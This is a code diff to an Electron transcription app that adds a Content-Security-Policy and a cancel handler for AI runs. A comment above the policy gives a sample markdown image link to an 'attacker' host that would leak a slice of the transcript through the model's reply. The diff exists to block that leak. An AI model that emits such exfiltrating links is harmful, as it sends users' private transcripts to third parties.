@@ -23,7 +23,7 @@ import { cancelFfmpeg, discardExport, discardStaleExports, exportAudio, extractA
 import { pickUiLang, setUiLang, t, UI_LANGS, type UiLang } from './i18n';
 import { MAX_BROWSER_DECODE } from './pcm';
 import { MAX_PROMPT, type AiTask } from './prompts';
-import { AI_TASKS } from './summary';
+import { AI_TASKS, cancelAi } from './summary';
 
 // Linux hides WebGPU behind a flag and needs the Vulkan backend explicitly; without both, requestAdapter()
 // returns null (or only SwiftShader) and transcription drops to the much slower wasm engine.
@@ -221,6 +221,23 @@ const createWindow = () => {
 const rendererRoot = (): string => path.join(__dirname, `../renderer/${MAIN_WINDOW_VITE_NAME}`);
 
 /** Serves the built renderer over app://. Anything resolving outside the bundle directory is refused. */
+// What the window actually needs: the bundle itself, wasm compilation for onnxruntime, its blob workers, the
+// weights from Hugging Face (which redirects to cdn-lfs* / transfer.xethub.hf.co), and the bundled font. The
+// point of it is the one real hole — a `![](https://attacker/x?d=…)` in what the model writes back would
+// otherwise exfiltrate a slice of the transcript. It goes here and not in a meta tag because index.html is
+// also served by the dev server, where react-refresh's inline script would force 'unsafe-inline'.
+const CSP = [
+  "default-src 'none'",
+  "script-src 'self' 'wasm-unsafe-eval'",
+  "worker-src 'self' blob:",
+  "style-src 'self' 'unsafe-inline'",
+  "img-src 'self' data:",
+  "font-src 'self' data:",
+  "connect-src 'self' https://huggingface.co https://*.hf.co https://*.huggingface.co",
+  "form-action 'none'",
+  "base-uri 'none'",
+].join('; ');
+
 const serveBundle = async (request: Request): Promise<Response> => {
   const root = rendererRoot();
   const { pathname } = new URL(request.url);
@@ -229,7 +246,10 @@ const serveBundle = async (request: Request): Promise<Response> => {
   // path.join normalises the "..", so this catches both plain and percent-encoded traversal.
   if (file !== root && !file.startsWith(root + path.sep)) return new Response(null, { status: 403 });
 
-  return net.fetch(pathToFileURL(file).toString());
+  const response = await net.fetch(pathToFileURL(file).toString());
+  const headers = new Headers(response.headers);
+  headers.set('Content-Security-Policy', CSP);
+  return new Response(response.body, { status: response.status, headers });
 };
 
 // The renderer never touches the filesystem: it gets a path only from this native dialog.
@@ -410,6 +430,9 @@ ipcMain.handle('ai:run', (_event, task: unknown, transcript: unknown, prompt: un
   return run(transcript, edited);
 });
 
+// A five-minute run the window stopped waiting for; the handler above rejects with `killed` and the window knows.
+ipcMain.on('ai:cancel', cancelAi);
+
 // This method will be called when Electron has finished
 // initialization and is ready to create browser windows.
 // Some APIs can only be used after this event occurs.
@@ -433,6 +456,7 @@ ipcMain.on('ffmpeg:download', () => void shell.openExternal('https://ffmpeg.org/
 
 app.on('will-quit', () => {
   cancelFfmpeg(); // a conversion still running would outlive the window
+  cancelAi(); // and so would a claude run
   discardExport();
   releaseInhibitor(); // the pipe would do it anyway; this is the tidy way out
 });
